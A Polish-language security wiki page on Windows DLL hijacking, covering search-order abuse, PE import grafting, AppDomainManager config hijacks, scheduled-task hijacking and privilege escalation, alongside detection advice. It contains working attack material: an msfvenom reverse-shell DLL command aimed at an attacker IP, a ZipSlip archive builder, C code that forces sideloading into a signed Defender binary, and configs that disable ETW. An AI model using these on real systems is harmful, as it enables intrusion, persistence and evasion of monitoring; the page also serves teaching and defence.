# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Wykorzystuje się je głównie do wykonywania kodu i utrzymywania dostępu, a rzadziej do eskalacji uprawnień. Chociaż tutaj skupiamy się na eskalacji uprawnień, sam sposób przejęcia pozostaje taki sam niezależnie od celu.

### Typowe techniki

Wykorzystuje się kilka metod DLL hijacking, a skuteczność każdej z nich zależy od sposobu, w jaki aplikacja ładuje biblioteki DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie prawdziwej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnej biblioteki.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce przeszukiwania znajdującej się przed ścieżką do legalnej biblioteki, wykorzystując kolejność wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, sądząc, że jest to wymagana, ale nieistniejąca biblioteka.
4. **DLL Redirection**: Zmiana parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS. Metoda ta jest często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może też implementować **własny loader DLL**. Proces z podwyższonymi uprawnieniami może wyliczać pliki w katalogu podrzędnym, takim jak `Libraries` lub `Plugins`, a następnie przekazywać wybraną bibliotekę DLL do procesu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki w tym konkretnym katalogu, potraktuj to jako trop do sprawdzenia: potwierdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru pliku i możliwość wykonania operacji ładowania. Zapis do katalogu obok pliku wykonywalnego nie dowodzi, że proces ładuje stamtąd biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Klasyczne side-loading pozostawia zaufany plik PE bez zmian i wykorzystuje mechanizm rozwiązywania nazw bibliotek DLL. **Import grafting** polega natomiast na modyfikacji pliku PE już załadowanego przez zaufany program. Atakujący dodaje deskryptor importu oraz powiązane z nim wpisy lookup/IAT wskazujące na kontrolowaną przez niego bibliotekę DLL. Gdy Windows rekurencyjnie rozwiązuje tę zależność, mapuje dodaną bibliotekę DLL i uruchamia jej kod inicjalizacyjny w skądinąd legalnym procesie. Jest to modyfikacja pliku PE na dysku, a nie ta sama operacja co zastąpienie wskaźnika funkcji w działającej tablicy IAT za pomocą hooka działającego w czasie wykonywania.<sup>[[26]](#references)[[27]](#references)</sup>

Zmodyfikowany plik PE może być pośrednią biblioteką DLL dostawcy, a nie plikiem wykonywalnym uruchamianym przez użytkownika lub Task Scheduler. Możliwy do ponownego wykorzystania łańcuch wygląda następująco:<sup>[[27]](#references)</sup>

1. Skopiuj legalny plik wykonywalny i jego zależności do katalogu kontrolowanego przez atakującego.
2. Zmodyfikuj struktury importu jednej z zależności, aby wskazywały na złośliwą bibliotekę DLL, zachowując oczekiwane eksporty i zwykłe działanie tej zależności.
3. Skonfiguruj autorun lub zaplanowane zadanie tak, aby uruchamiało legalny plik wykonywalny. Loader mapuje zmodyfikowaną zależność, a następnie nowo zaimportowaną bibliotekę DLL. Zobacz [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks), aby dowiedzieć się, jak wyliczać zadania.
4. Nie umieszczaj czasochłonnych operacji w `DllMain`; zaobserwowany loader tworzył wątek roboczy i kontynuował w nim etapowe odszyfrowywanie.

Różni się to od ataku na łańcuch dostaw po stronie dostawcy, jeśli pakiet dostawcy jest czysty, a modyfikacja importu następuje po instalacji. Przeanalizuj każdy moduł w przygotowanym katalogu, nie tylko plik hosta EXE: porównaj listy importów i skróty zależności z zaufaną instalacją, zweryfikuj podpisy i sprawdź pliki binarne dostawcy uruchamiane z nieoczekiwanych lokalizacji z możliwością zapisu, takich jak `C:\ProgramData`. Zaplanowane zadanie wskazujące na skopiowany moduł zgłaszania awarii lub aktualizator w takim katalogu to szczególnie przydatny punkt wyjścia do dalszej analizy.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczne DLL sideloading to nie jedyny sposób na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **zarządzaną**, CLR sprawdza również **plik konfiguracyjny aplikacji** o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). W tym pliku można zdefiniować własny **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego zestaw umieszczony obok pliku EXE, CLR ładuje go **przed zwykłym przepływem wykonywania kodu aplikacji** i uruchamia w zaufanym procesie.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć własnego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Uwagi praktyczne:
- Ta technika jest specyficzna dla **.NET Framework**. Opiera się na parsowaniu konfiguracji CLR, a nie na kolejności wyszukiwania DLL Win32.
- Host musi być rzeczywiście **zarządzanym plikiem EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie **nagłówka CLR Runtime** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`); zwykle znajduje się on **obok pliku EXE**.
- Ta technika przydaje się w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwy zarządzany assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może posłużyć jako **pierwszy etap**, po którym nastąpi klasyczne DLL sideloading lub reflective loading kolejnych etapów.

### AppDomainManager jako downloader + bootstrap zaplanowanego zadania

Praktyczny schemat włamania polega na połączeniu zaufanego pliku EXE zarządzanego przez .NET ze złośliwym plikiem `*.config` i złośliwą biblioteką DLL AppDomainManager, która pełni wyłącznie rolę **niewielkiego bootstrappera**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub aktualizator .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Plik konfiguracyjny znajdujący się obok powoduje, że CLR ładuje assembly atakującego **przed rozpoczęciem działania właściwej aplikacji**.
3. Złośliwy manager wykonuje **kontrolę ścieżki** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE został uruchomiony z `Downloads`, i pozwala uruchomić drugi etap tylko z `%LOCALAPPDATA%`).
4. Jeśli kontrola się powiedzie, pobiera właściwy payload do ścieżki zapisywalnej przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia trwałość za pomocą zaplanowanego zadania.

Dlaczego ten wariant ma znaczenie:
- Podpisany plik hosta EXE pozostaje niezmieniony, więc analiza wstępna, która sprawdza tylko hash głównego pliku binarnego, może nie wykryć naruszenia.
- Prosta **analiza antyanalityczna oparta na ścieżce** jest powszechna: przeniesienie zestawu ZIP/EXE/DLL na Pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- DLL AppDomainManager pierwszego etapu może pozostać niewielka i mało zauważalna, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład ustanawiania trwałości często spotykany w tym schemacie:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny** poziom dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często lepiej klasyfikować jako **wykonywanie/persistence przez nadużycie konfiguracji .NET** niż klasyczny hijacking kolejności wyszukiwania brakującej DLL, choć operatorzy często łączą obie techniki.

Punkty wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek ekstrakcji ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, mające **obok siebie** plik `<exe>.config`.
- Nowe zaplanowane zadania, których akcja wskazuje lokalizację w `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a ich nazwy przypominają zadania aktualizatorów przeglądarek lub dostawców oprogramowania.
- Krótkotrwałe procesy bootstrapujące zarządzane przez .NET, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanej lokalizacji w profilu użytkownika.

### Przejęcie istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideloadingu

W przypadku persistence nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizatora**, a następnie **zmieniają akcję zadania**, dzięki czemu jego istniejąca nazwa, autor i wyzwalacz pozostają znajome dla obrońców.

Wielokrotnego użytku procedura:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby zadanie uruchamiało **zaufany plik hosta EXE** z katalogu tymczasowego zapisywalnego przez użytkownika, który następnie przeprowadza sideloading lub ładuje właściwy payload przez AppDomain.
4. Ponownie zarejestruj zadanie pod tą samą nazwą, zamiast tworzyć nowy, oczywisty artefakt persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest to trudniejsze do wykrycia:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak zadanie aktualizatora dostawcy).
- Uruchamia je **usługa Task Scheduler**, więc walidacja procesu nadrzędnego lub przodków często wykrywa oczekiwany łańcuch uruchamiania zaplanowanego zadania zamiast `explorer.exe`.
- Zespoły DFIR, które szukają tylko **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Przydatne punkty do szybkiego wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML w `C:\Windows\System32\Tasks\*` i metadane w `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z bazową konfiguracją.
- Generuj alert, gdy zadanie aktualizatora **wyglądające na zadanie dostawcy** uruchamia się z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik .NET EXE z plikiem `*.config` w tym samym katalogu.

> [!TIP]
> Aby zapoznać się z łańcuchem działań krok po kroku, który łączy przygotowanie plików HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloading, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Wykrywanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **następujących 2 filtrów**:

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, taki jak **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą proces z podwyższonymi uprawnieniami próbuje załadować** z lokalizacji, do której masz uprawnienia zapisu. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym prawidłową DLL albo gdy żądana DLL nie istnieje, a możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz informacje o tym, jak dokładnie ładowane są DLL.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **wstępnie zdefiniowanych ścieżek wyszukiwania** w określonej kolejności. Do DLL hijacking dochodzi, gdy szkodliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed prawidłową DLL. Można temu zapobiec, upewniając się, że aplikacja używa ścieżek bezwzględnych podczas odwoływania się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która zwraca ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla danej aplikacji określonej w kluczu rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Po wyłączeniu tej funkcji bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpocznie się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

DLL można też załadować, podając ścieżkę bezwzględną zamiast nazwy. W takim przypadku Windows szuka samej DLL tylko pod tą ścieżką; zależności określone nazwą nadal są wyszukiwane zgodnie z właściwą kolejnością.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Łączenie dowolnego zapisu pliku z hijack brakującej DLL

**Powiązana technika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny jest uruchamiany **zgodnie z harmonogramem/jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Przygotuj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli używasz prymitywu **dowolnego zapisu w stylu ZipSlip**, przygotuj archiwum ZIP, którego wpis wychodzi poza katalog rozpakowywania, aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanego inboxa/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą DLL i wykona twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowaną metodą deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można wymusić, aby proces docelowy, który rozwiązuje nazwę importowanej DLL (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), załadował złośliwą DLL z tego katalogu.

Kluczowy pomysł
- Utwórz parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny procesu docelowego będzie rozwiązywał nazwę DLL, loader uwzględni podaną DllPath podczas wyszukiwania, umożliwiając niezawodny sideloading nawet wtedy, gdy złośliwa DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, która wpływa tylko na bieżący proces.
- Proces docelowy musi importować DLL lub wywoływać LoadLibrary z nazwą DLL (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki bezwzględne nie mogą zostać przejęte. Eksporty przekazywane dalej i SxS mogą zmieniać kolejność wyszukiwania.

Minimalny przykład w C (ntdll, ciągi znaków wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekazujący wywołania do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll według nazwy, używając powyższej techniki. Loader rozwiąże import za pomocą podanego DllPath i wykona sideloading Twojej biblioteki DLL.

Zaobserwowano wykorzystanie tej techniki w rzeczywistych atakach do przeprowadzania wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie biblioteki DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking w .NET za pośrednictwem `.exe.config`

W przypadku celów **.NET Framework** sideloading może nastąpić **przed `Main()`** bez modyfikowania pamięci, przez nadużycie sąsiadującego z aplikacją pliku **`.exe.config`**. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik EXE .NET obok złośliwego pliku konfiguracyjnego i co najmniej jednego kontrolowanego przez siebie zestawu.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Plik konfiguracyjny ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko uruchomieniowe utworzyło kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje możliwość **wykonania kodu przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ten sam plik konfiguracyjny może wymusić, by CLR najpierw rozwiązywał odwołania do lokalnych zestawów (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetrię środowiska uruchomieniowego bez modyfikowania kodu inline.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może się różnić zależnie od dyrektywy lub wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zmieniając ten folder w przewidywalną powierzchnię do sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może umożliwić aplikacji full-trust ładowanie niepodpisanych lub zmodyfikowanych assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher-policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** zapewnia bardziej deterministyczny wybór runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** na podstawie konfiguracji, zamiast aby implant patchował `EtwEventWrite` w pamięci.

Schemat operacyjny obserwowany w niedawnych kampaniach:
- Etap 1 umieszcza `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnie wyglądającego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe` i ponownie go uruchamia za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany proces nadrzędny `svchost.exe` uruchomiony przez Task Scheduler), a następnie ładuje końcowy plik DLL/eksport RAT.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET**, uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zadania zaplanowane, które ponownie uruchamiają zmienione nazwy plików binarnych update z **`%LOCALAPPDATA%`** lub katalogów specyficznych dla aplikacji `\bin\update\`.
- Łańcuchy procesów nadrzędnych/potomnych, w których zadanie zaplanowane uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza katalogu dostawcy z własnego katalogu.

#### Wyjątki dotyczące kolejności wyszukiwania dll opisane w dokumentacji Windows

Dokumentacja Windows wymienia następujące wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **plik DLL o takiej samej nazwie jak plik już załadowany do pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a następnie używa pliku DLL znajdującego się już w pamięci. **W tym przypadku system nie wyszukuje pliku DLL**.
- Jeśli plik DLL jest rozpoznawany jako **znana biblioteka DLL** w bieżącej wersji Windows, system używa swojej wersji tej znanej biblioteki DLL wraz z jej zależnymi plikami DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych bibliotek DLL.
- Jeśli **plik DLL ma zależności**, wyszukiwanie zależnych plików DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy plik DLL został wskazany pełną ścieżką.

### Eskalacja uprawnień

**Wymagania**:

- Znajdź proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch poziomy lub lateral movement) i któremu **brakuje pliku DLL**.
- Upewnij się, że masz **uprawnienia do zapisu** w dowolnym **katalogu**, w którym będzie **wyszukiwany plik DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Takie warunki rzadko występują domyślnie: uprzywilejowane pliki wykonywalne zwykle nie mają brakujących zależności DLL, a zwykli użytkownicy zazwyczaj nie mogą zapisywać w katalogach systemowej ścieżki wyszukiwania. Błędnie skonfigurowane środowiska mogą jednak spełniać oba warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Jego głównym celem jest wprawdzie obejście UAC, ale zawiera PoC DLL hijacking dla określonych wersji Windows, które często można dostosować do znalezionego zapisywalnego katalogu.

Pamiętaj, że możesz **sprawdzić swoje uprawnienia do folderu**, używając:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **sprawdź uprawnienia do wszystkich folderów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz też sprawdzić importy pliku wykonywalnego i eksporty DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

